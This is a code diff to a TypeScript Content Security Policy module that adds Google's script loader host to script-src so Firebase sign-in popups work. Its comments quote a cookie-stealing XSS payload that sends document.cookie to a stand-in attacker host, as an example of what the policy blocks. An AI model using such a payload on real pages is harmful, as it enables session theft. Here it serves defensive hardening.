@@ -35,11 +35,11 @@
  * payload the review actually demonstrated was
  * `fetch("https://evil.example?c=" + document.cookie)`, and `connect-src 'self'`
  * refuses it. So does the `<img>` beacon, under `img-src`. Loading a second
- * stage from an attacker's origin is refused by `script-src 'self'`, posting the
- * page's data to one by `form-action 'self'`, rewriting every relative URL on
- * the page by `base-uri 'self'`, and the plugin-based vectors by
- * `object-src 'none'`. An injection becomes noisy and local instead of a
- * foothold.
+ * stage from an attacker's origin is refused by `script-src`, which names this
+ * origin and one Google host and nothing else; posting the page's data to one
+ * is refused by `form-action 'self'`, rewriting every relative URL on the page
+ * by `base-uri 'self'`, and the plugin-based vectors by `object-src 'none'`. An
+ * injection becomes noisy and local instead of a foothold.
  *
  * Read `experimental.sri` in `next.config.ts` for the one hardening deliberately
  * not taken.
@@ -59,6 +59,35 @@ const GOOGLE_IDENTITY_HOSTS = [
   'https://identitytoolkit.googleapis.com',
   'https://securetoken.googleapis.com',
 ] as const;
+
+/**
+ * Google's script loader, which the sign-in popup does not open without.
+ *
+ * `signInWithPopup` does not go straight to `window.open`. It initialises the
+ * resolver first — `browserPopupRedirectResolver`, wired up explicitly in
+ * `lib/firebase.ts` — and that resolver initialises by injecting a `<script>`
+ * for `https://apis.google.com/js/api.js`, the URL the SDK registers as its
+ * `gapiScript`. Only once gapi has loaded does it embed the hidden
+ * `https://{authDomain}/__/auth/handler` iframe that carries the answer back.
+ *
+ * A `script-src` omitting this host does not degrade the flow, it ends it: the
+ * loader is refused, `_loadGapi` rejects, and every Google sign-in fails with
+ * `auth/network-request-failed` — a message that sends the reader looking for a
+ * network outage rather than for a header. The first version of this file
+ * omitted it, and a test asserting that `script-src` named no remote host at
+ * all stood over the omission looking like a security property.
+ *
+ * One host covers the whole of it: the loader fetches its own modules from
+ * `https://apis.google.com/_/scs/…`, the same origin. The reCAPTCHA scripts the
+ * SDK also registers are deliberately absent — only `RecaptchaVerifier` and
+ * phone auth load those, and this application uses neither.
+ *
+ * Named unconditionally, like the identity hosts above and for the same reason:
+ * it is Google's host rather than the project's, so it does not vary with a
+ * self-hoster's configuration, and a policy whose shape changes with the
+ * environment is one nobody can review by reading it.
+ */
+const GOOGLE_SCRIPT_HOST = 'https://apis.google.com';
 
 /**
  * The project's own Firebase domain, read from the config the client already
@@ -115,9 +144,17 @@ export function contentSecurityPolicy({ isDevelopment, firebaseConfig }: CspOpti
     // reachable by an attacker who cannot already inject into the document, and
     // an attacker who can is constrained by every other directive here.
     //
+    // The Google host is the sign-in popup's script loader, and is the only
+    // remote origin this application ever executes code from — see above.
+    //
     // In development React reconstructs server stacks with `eval`, which is
     // exactly the capability a deployment must not hand out.
-    'script-src': ["'self'", "'unsafe-inline'", ...(isDevelopment ? ["'unsafe-eval'"] : [])],
+    'script-src': [
+      "'self'",
+      "'unsafe-inline'",
+      GOOGLE_SCRIPT_HOST,
+      ...(isDevelopment ? ["'unsafe-eval'"] : []),
+    ],
 
     // Inline styles are a different risk from inline scripts: they cannot call
     // anything, and the exfiltration tricks built on CSS selectors need a
